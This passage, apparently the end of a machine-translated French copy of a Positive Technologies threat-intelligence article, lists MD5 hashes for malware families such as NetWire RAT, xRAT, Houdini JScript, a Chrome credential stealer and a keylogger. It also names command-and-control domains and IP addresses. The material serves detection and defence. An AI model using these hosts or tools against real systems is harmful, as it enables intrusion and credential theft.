5b6d77f3e48e7723498ede5d5ba54f26 <br>  621a0133e28edec77a2d3e75115b8655 <br>  712e7ec49ad3b8c91b326b6d5ee8dcd8 <br>  731a3d72e3d36c2270c1d0711c73c301 <br>  929374b35a73c59fe97b336d0c414389 <br><br>  Chargeurs LNK: <br>  3bc5d95e2bd2d52a300da9f3036f5b3b <br>  527069e966b4a854df35aef63f45986a <br>  a4667e0b3bfaca0cda5c344f1475b8e0 <br><br>  Houdini JScript: <br>  04c2ad67de2cea3f247cf50c5e12e969 <br>  5ab9176b9ed9f7a776ec82c412a89eab <br>  84f0d098880747f417703f251a2e0d1c <br>  94c6ba0d812b4daf214263fffc951a20 <br>  a52509a38846b55a524019f2f1a06ade <br>  bf2fb6cdbc9fde99e186f01ad26f959f <br>  c871091ce44594adbd6cf4388381e410 <br>  daf6a9eb55813d1a151695d33506179d <br>  f010af1b330d00abb5149e9defdae6ee <br>  ff924faeb9dfd7384c05abe855566fc9 <br><br>  Pot Bcorp <br>  59978b5a9e4ab36da0f31a8f616cc9d3 <br>  a7219da3b0c0730c476fe340dbf7e4e5 <br>  ddac55213089da9ef407bce05ebe653e <br><br>  Get-chromecreds <br>  11769e9f49123a2af00bd74453221c07 <br>  1a81c9119d7761535c198ddb761979b8 <br>  42a85849a591e65b0254d9bcbdf59f82 <br>  8e49263f33c53ee5bc91bebbf9617352 <br>  c9ab090ad2badb9862fd5b6058428096 <br><br>  Start-keylogger <br>  55daa84475a11ea656183e0ad5ccc608 <br>  aa82fbb6a341d71d2431b6d2ebca027c <br><br>  WebBrowserPassView <br>  7722e086cf7ed59955a1d6ec26f49cf3 <br><br>  NetWire RAT <br>  1470a08bd427bb8738a254ba4f130ff5 <br>  5f8495016773c7834b1c588f0997a6c4 <br><br>  √âcoute TCP <br>  913567da98185cad9f91a570dc298de1 <br><br>  Chargeurs de script <br>  02946d10c6a34fe74826f3c0b0a6a3e0 <br>  1ad644bdba488a6e42ad76aea2c0ee54 <br>  3a2dcf36b9206a135daa73c645a3f56f <br>  4dddd87d3cb80145c9859fd76dfef794 <br>  74c5e5be9f79bd9e7ee84fd046c14e68 <br>  78f4d5fa6c68dae4b03860b54ec6cc67 <br><br>  Petits chargeurs PE <br>  0f3c56018a7051aebe060454fc981f5b <br>  1b9cefc229daddc4557cea0e3bdf4656 <br>  29e6679107bd9c72aa061371082206bb <br>  b66b7395825b9ed656b768d4e7fe1de7 <br>  fbc606b8b04e51ddb342e29b84ac1edb <br><br>  xRAT <br>  2e9a0637478938cc3e4519aa7b4219cc <br>  7c67c93ba243be32e5fd6a6921ceded3 <br><br>  Panneau Bcorp contre  constructeur <br>  405c987ba1a8568e2808da2b06bc9047 <br>  c3ac8b7a7c8c0d100e3c2af8ccd11441 <br><br>  Bcorp C&amp;C <br>  bcorp.fun <br>  bkorp.xyz <br>  buhar.us <br>  definebilimi.com <br>  husan.ddns.net <br>  husan2.ddns.net <br>  husan3.ddns.net <br>  i36-imgur.com <br>  i37-imgur.com <br>  i38-imgur.com <br>  i39-imgur.com <br>  prntsrcn.com <br>  qqww.eu <br>  5.255.63.12 <br>  192.95.3.137 <br>  192.95.3.14 </div></div><br><br>  <b>Publi√© par</b> Alexey Vishnyakov, Positive Technologies </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr479998/">https://habr.com/ru/post/fr479998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr479978/index.html">Comme sans douleur, sans captcha et gratuitement pour apporter des extraits du Fonds f√©d√©ral des biens de l'√âtat du Registre d'√âtat unifi√© des droits de l'homme sous une forme lisible par l'homme (*)</a></li>
<li><a href="../fr479982/index.html">Vidos et insectes</a></li>
<li><a href="../fr479988/index.html">Concours technologiques Radiofest-2019. R√©sum√©</a></li>
<li><a href="../fr479992/index.html">Comment enseigner √† UITextView √† se d√©marquer magnifiquement</a></li>
<li><a href="../fr479996/index.html">Transistors 2 nm: hachez-vous ou hachez-vous?</a></li>
<li><a href="../fr480000/index.html">Indicateur de qualit√© du canal WebRTC du serveur sur TCP</a></li>
<li><a href="../fr480002/index.html">Revoir DevOpsDays Moscou: aper√ßu de 6 rapports</a></li>
<li><a href="../fr480006/index.html">Indicateur de qualit√© de canal pour le serveur WebRTC sur TCP</a></li>
<li><a href="../fr480008/index.html">Yuri Rogachev: "Je suis venu faire le M-1, ne connaissant pas la technologie informatique"</a></li>
<li><a href="../fr480010/index.html">Les 3 principaux √©l√©ments HTML que nous avons oubli√©s</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>